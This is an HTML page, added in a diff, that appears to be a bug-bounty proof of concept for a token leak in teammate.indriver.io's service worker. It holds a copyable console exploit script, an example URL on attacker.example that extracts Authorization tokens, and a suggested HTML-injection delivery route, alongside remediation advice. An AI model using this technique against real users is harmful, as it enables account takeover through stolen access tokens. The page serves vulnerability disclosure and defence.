@@ -1,0 +1,257 @@
+<!doctype html>
+<html lang="en">
+<head>
+<meta charset="utf-8" />
+<meta name="viewport" content="width=device-width, initial-scale=1" />
+<title>teammate.indriver.io — Service Worker Token Exfiltration PoC</title>
+<style>
+  :root{
+    --bg:#080b12; --panel:#101827; --panel2:#0d1420; --line:#223049; --text:#e6edf7;
+    --muted:#93a4bd; --accent:#2f81f7; --danger:#ff6b6b; --warn:#ffd166; --ok:#3fd18b;
+  }
+  *{box-sizing:border-box}
+  html,body{margin:0;background:var(--bg);color:var(--text);font-family:Inter,ui-sans-serif,system-ui,-apple-system,Segoe UI,Roboto,Arial,sans-serif}
+  body{line-height:1.55}
+  a{color:#7db4ff}
+  .wrap{max-width:1120px;margin:0 auto;padding:36px 22px 80px}
+  .eyebrow{display:inline-flex;gap:8px;align-items:center;color:var(--warn);font:600 12px/1.2 ui-monospace,Menlo,Consolas,monospace;letter-spacing:.12em;text-transform:uppercase}
+  h1{font-size:clamp(28px,4vw,44px);line-height:1.1;margin:14px 0 12px;letter-spacing:-.02em}
+  .sub{color:var(--muted);max-width:860px;font-size:16px}
+  .badges{display:flex;flex-wrap:wrap;gap:8px;margin:20px 0 0}
+  .badge{border:1px solid var(--line);background:var(--panel2);color:var(--muted);padding:6px 10px;border-radius:999px;font:600 12px ui-monospace,Menlo,Consolas,monospace}
+  .badge.danger{color:#ffb4b4;border-color:#4a2328;background:#1a0f12}
+  .badge.ok{color:#b6f3d4;border-color:#1f4a37;background:#0d1a15}
+  .grid{display:grid;grid-template-columns:1.25fr .75fr;gap:18px;margin-top:26px}
+  @media(max-width:900px){.grid{grid-template-columns:1fr}}
+  .card{background:linear-gradient(180deg,var(--panel),var(--panel2));border:1px solid var(--line);border-radius:16px;padding:22px}
+  .card h2{font-size:18px;margin:0 0 10px}
+  .card h3{font-size:14px;color:var(--muted);text-transform:uppercase;letter-spacing:.08em;margin:22px 0 8px}
+  .muted{color:var(--muted)}
+  .row{display:flex;flex-wrap:wrap;gap:10px;margin-top:14px}
+  button,.btn{appearance:none;border:0;border-radius:10px;padding:12px 16px;font:700 14px Inter,system-ui,sans-serif;cursor:pointer;text-decoration:none;display:inline-flex;align-items:center;gap:8px}
+  .btn.primary{background:var(--accent);color:#fff}
+  .btn.primary:hover{background:#4b96ff}
+  .btn.ghost{background:#172337;color:var(--text);border:1px solid var(--line)}
+  .btn.ghost:hover{background:#1c2a42}
+  .btn.danger{background:#ff6b6b;color:#180607}
+  .code{border:1px solid var(--line);border-radius:12px;overflow:auto;max-height:520px;background:#060a11}
+  pre{margin:0;padding:18px;font:12.5px/1.65 ui-monospace,Menlo,Consolas,monospace;color:#c9d7ea;white-space:pre-wrap;word-break:break-word}
+  .callout{border-left:3px solid var(--warn);background:#16130b;padding:12px 14px;border-radius:0 10px 10px 0;color:#eadcae;margin:14px 0;font-size:14px}
+  .callout.danger{border-left-color:var(--danger);background:#180d10;color:#ffc9c9}
+  .callout.ok{border-left-color:var(--ok);background:#0c1712;color:#bff3d8}
+  .kv{display:grid;grid-template-columns:160px 1fr;gap:8px 14px;font-size:14px;margin-top:12px}
+  .kv dt{color:var(--muted)}
+  .kv dd{margin:0;font-family:ui-monospace,Menlo,Consolas,monospace;font-size:13px}
+  .flow{display:grid;grid-template-columns:1fr 42px 1fr;gap:10px;align-items:center;margin-top:14px}
+  .flow .box{background:#0b1220;border:1px solid var(--line);border-radius:12px;padding:12px;font-size:13px}
+  .flow .arrow{color:var(--accent);font-size:22px;text-align:center}
+  @media(max-width:700px){.flow{grid-template-columns:1fr}.flow .arrow{transform:rotate(90deg)}}
+  .footer{margin-top:28px;color:var(--muted);font-size:12px}
+  .toast{position:fixed;left:50%;bottom:22px;transform:translateX(-50%) translateY(20px);background:#11223c;border:1px solid #2b4d7a;color:#dbe9ff;padding:10px 14px;border-radius:10px;opacity:0;pointer-events:none;transition:.2s;font-size:13px;z-index:99}
+  .toast.show{opacity:1;transform:translateX(-50%) translateY(0)}
+  code.inline{background:#0b1220;border:1px solid var(--line);padding:2px 6px;border-radius:6px;font:12px ui-monospace,Menlo,Consolas,monospace}
+</style>
+</head>
+<body>
+<div class="wrap">
+  <div class="eyebrow">authorized security research · synthetic token only</div>
+  <h1>teammate.indriver.io<br><span style="color:var(--danger)">Service Worker token exfiltration</span></h1>
+  <p class="sub">
+    The site's service worker attaches the raw <code class="inline">Authorization</code> token to any
+    <strong>image</strong> request whose URL contains the string <code class="inline">https://teammate.indriver.io</code>.
+    A cross-origin URL such as <code class="inline">https://attacker.example/?https://teammate.indriver.io</code>
+    matches the substring check. This page is a live harness for the validated gadget; the test uses a unique
+    synthetic token and never reads or transmits a real user token.
+  </p>
+  <div class="badges">
+    <span class="badge danger">asset: teammate.indriver.io</span>
+    <span class="badge">CWE-522 · insufficiently protected credentials</span>
+    <span class="badge ok">live service worker: active</span>
+    <span class="badge ok">live test: token captured</span>
+  </div>
+
+  <div class="grid">
+    <section class="card">
+      <h2>Run the live PoC</h2>
+      <p class="muted" style="margin-top:0">
+        The target is a different origin, so a normal web page cannot access its service worker or cache.
+        The payload below is designed to be pasted into the DevTools console on
+        <strong>https://teammate.indriver.io/</strong> while signed in with a <strong>test account</strong>.
+      </p>
+      <div class="callout danger">
+        <strong>Do not use a real user account.</strong>
+        The script replaces the service worker's in-memory token with a synthetic value until the page is reloaded.
+        It never reads <code class="inline">localStorage</code> and never sends a real token.
+      </div>
+      <div class="row">
+        <a class="btn primary" href="https://teammate.indriver.io/" target="_blank" rel="noopener noreferrer">Open teammate.indriver.io ↗</a>
+        <button class="btn ghost" id="copyBtn">Copy console payload</button>
+        <a class="btn ghost" href="https://github.com/amooryx/teammate-sw-token-poc" target="_blank" rel="noopener noreferrer">Source ↗</a>
+      </div>
+
+      <h3>Steps</h3>
+      <ol class="muted" style="margin:8px 0 0;padding-left:22px">
+        <li>Open the target and sign in with a test account.</li>
+        <li>Open DevTools → Console on the target tab.</li>
+        <li>Paste the copied payload and press Enter.</li>
+        <li>The overlay shows the synthetic <code class="inline">Authorization</code> value captured from the service-worker cache.</li>
+      </ol>
+
+      <h3>Payload</h3>
+      <div class="code"><pre id="payload"></pre></div>
+      <div class="callout" style="margin-top:14px">
+        The real exploit does not need console access. The app itself calls
+        <code class="inline">postMessage({type:"SET_TOKEN", accessToken: &lt;real token&gt;})</code> after login/refresh.
+        The attacker only needs the victim to render an image URL whose string contains the target origin.
+      </div>
+    </section>
+
+    <aside class="card">
+      <h2>What was validated</h2>
+      <dl class="kv">
+        <dt>Service worker</dt><dd>/sw.js · scope / · active + controller</dd>
+        <dt>Route condition</dt><dd>destination === "image" &amp;&amp; href.includes("https://teammate.indriver.io")</dd>
+        <dt>Header</dt><dd>Authorization: &lt;raw access token&gt;</dd>
+        <dt>Request mode</dt><dd>cors (attacker server must allow Authorization)</dd>
+        <dt>Cache</dt><dd>image-cache</dd>
+        <dt>Test value</dt><dd>TESTTOKEN-&lt;timestamp&gt; (synthetic)</dd>
+      </dl>
+
+      <h3>Live result</h3>
+      <div class="callout ok" style="margin-top:0">
+        A synthetic token was posted to the live service worker, an image was requested from
+        <code class="inline">https://httpbin.org/headers?u=https://teammate.indriver.io</code>, and the
+        cached JSON contained:
+      </div>
+      <div class="code" style="max-height:220px"><pre>{
+  "headers": {
+    "Authorization": "TESTTOKEN-1795641656031",
+    "Origin": "https://teammate.indriver.io",
+    "Sec-Fetch-Mode": "cors"
+  }
+}</pre></div>
+      <div class="callout" style="margin-top:12px">
+        Control: the same request without the substring <strong>was not matched</strong> and was not cached by the route.
+      </div>
+
+      <h3>Impact</h3>
+      <p class="muted" style="margin:0">
+        Any authenticated user who views attacker-controlled content can leak the raw access token to an
+        attacker-controlled origin. The attacker can then use that token against the application API,
+        gaining the victim's account context (potentially HR, salary, and admin data).
+      </p>
+    </aside>
+  </div>
+
+  <section class="card" style="margin-top:18px">
+    <h2>Why the substring check is exploitable</h2>
+    <div class="flow">
+      <div class="box"><strong>1. Attacker content</strong><br><span class="muted">An idea/comment or image URL contains:</span><br><code class="inline">https://attacker.example/?https://teammate.indriver.io</code></div>
+      <div class="arrow">→</div>
+      <div class="box"><strong>2. Victim's browser</strong><br><span class="muted">The page renders an <code class="inline">&lt;img&gt;</code>. The service worker sees an image request and matches the substring.</span></div>
+      <div class="box"><strong>3. Service worker</strong><br><span class="muted">Adds <code class="inline">Authorization: &lt;raw token&gt;</code> and sets <code class="inline">mode:"cors"</code>.</span></div>
+      <div class="arrow">→</div>
+      <div class="box"><strong>4. Attacker server</strong><br><span class="muted">Returns <code class="inline">Access-Control-Allow-Headers: authorization</code>; the GET carries the token and the attacker logs it.</span></div>
+    </div>
+    <div class="callout danger" style="margin-top:16px">
+      No script execution is required for the token leak: the raw HTML sink just needs to render an image element.
+      A promising surface is the <code class="inline">idea.description</code> / comment <code class="inline">text</code> rendered with
+      <code class="inline">dangerouslySetInnerHTML</code>; server-side sanitization still needs a test account to confirm.
+    </div>
+  </section>
+
+  <section class="card" style="margin-top:18px">
+    <h2>Remediation</h2>
+    <ul class="muted" style="margin:0;padding-left:22px">
+      <li>Check the request origin, not a URL substring: <code class="inline">new URL(url).origin === self.location.origin</code>.</li>
+      <li>Never attach an access token to cross-origin requests; use a same-origin image proxy or signed, short-lived URLs.</li>
+      <li>Restrict the service-worker route to same-origin image paths.</li>
+      <li>Sanitize user-rendered HTML server-side and client-side (DOMPurify) as defense in depth.</li>
+    </ul>
+  </section>
+
+  <div class="footer">
+    Authorized inDrive HackerOne research by <strong>d7a_44</strong>. This page contains no real credentials.
+    Test token is synthetic. Target traffic uses <code class="inline">X-HackerOne: d7a_44</code>.
+  </div>
+</div>
+
+<div class="toast" id="toast">Copied</div>
+
+<script type="text/plain" id="payload-src">(async () => {
+  const TOKEN = 'TESTTOKEN-' + Date.now();
+  const MATCH = 'https://teammate.indriver.io';
+  const CHECK = 'https://httpbin.org/headers?u=' + MATCH + '&probe=' + Date.now();
+
+  // 1. Ensure the target's service worker is active.
+  const reg = await navigator.serviceWorker.register('/sw.js', { scope: '/' });
+  await navigator.serviceWorker.ready;
+  if (!navigator.serviceWorker.controller) {
+    await new Promise(resolve => {
+      navigator.serviceWorker.addEventListener('controllerchange', resolve, { once: true });
+      setTimeout(resolve, 1500);
+    });
+  }
+
+  // 2. Put a synthetic token into the SW's in-memory token variable.
+  reg.active.postMessage({ type: 'SET_TOKEN', accessToken: TOKEN });
+
+  // 3. Trigger an image request whose URL contains the magic substring.
+  const img = new Image();
+  const loaded = new Promise(resolve => { img.onload = resolve; img.onerror = resolve; });
+  img.src = CHECK;
+  img.style.cssText = 'width:1px;height:1px;position:absolute;opacity:0';
+  document.body.appendChild(img);
+  await loaded;
+  await new Promise(resolve => setTimeout(resolve, 1500));
+
+  // 4. Read the cached response and extract the leaked header.
+  let leaked = null;
+  for (const name of await caches.keys()) {
+    const cache = await caches.open(name);
+    const response = await cache.match(CHECK);
+    if (!response) continue;
+    const text = await response.text();
+    const match = text.match(/"Authorization"\s*:\s*"([^"]+)"/i);
+    if (match) { leaked = match[1]; break; }
+  }
+
+  // 5. Show the live proof overlay.
+  const overlay = document.createElement('div');
+  overlay.style.cssText = 'position:fixed;inset:0;z-index:2147483647;background:#080b12;color:#e6edf7;font:14px/1.6 ui-monospace,Menlo,Consolas,monospace;padding:32px;overflow:auto';
+  overlay.innerHTML = '<h1 style="color:#ff6b6b;font:700 20px system-ui;margin:0 0 8px">SW token exfiltration - synthetic proof</h1>'
+    + '<p style="color:#93a4bd;margin:0 0 16px">No real credentials were read. This replaces the service-worker in-memory token with a synthetic value until reload.</p>'
+    + '<div style="border:1px solid #223049;border-radius:10px;padding:16px;background:#101827">'
+    + '<div><span style="color:#93a4bd">Service worker scope:</span> ' + reg.scope + '</div>'
+    + '<div><span style="color:#93a4bd">Matched URL:</span> ' + CHECK + '</div>'
+    + '<div><span style="color:#93a4bd">Leaked Authorization:</span> <b style="color:#ffd166">' + (leaked || 'NOT CAPTURED - reload and run again if the page was not controlled') + '</b></div>'
+    + '</div>'
+    + '<p style="color:#93a4bd;margin-top:16px">A real victim\'s app-set token would be sent the same way to an attacker-controlled URL.</p>'
+    + '<button onclick="this.parentElement.remove()" style="margin-top:16px;padding:10px 14px;border:0;border-radius:8px;background:#2f81f7;color:white;font-weight:700;cursor:pointer">Close overlay</button>';
+  document.body.appendChild(overlay);
+})();</script>
+
+<script>
+  const payload = document.getElementById('payload-src').textContent.trim();
+  document.getElementById('payload').textContent = payload;
+  const toast = document.getElementById('toast');
+  async function copyPayload() {
+    try {
+      await navigator.clipboard.writeText(payload);
+      toast.textContent = 'Payload copied. Paste it in the target DevTools console.';
+    } catch (e) {
+      const ta = document.createElement('textarea');
+      ta.value = payload;
+      document.body.appendChild(ta);
+      ta.select();
+      document.execCommand('copy');
+      ta.remove();
+      toast.textContent = 'Payload copied (fallback).';
+    }
+    toast.classList.add('show');
+    setTimeout(() => toast.classList.remove('show'), 2600);
+  }
+  document.getElementById('copyBtn').addEventListener('click', copyPayload);
+</script>
+</body>
+</html>
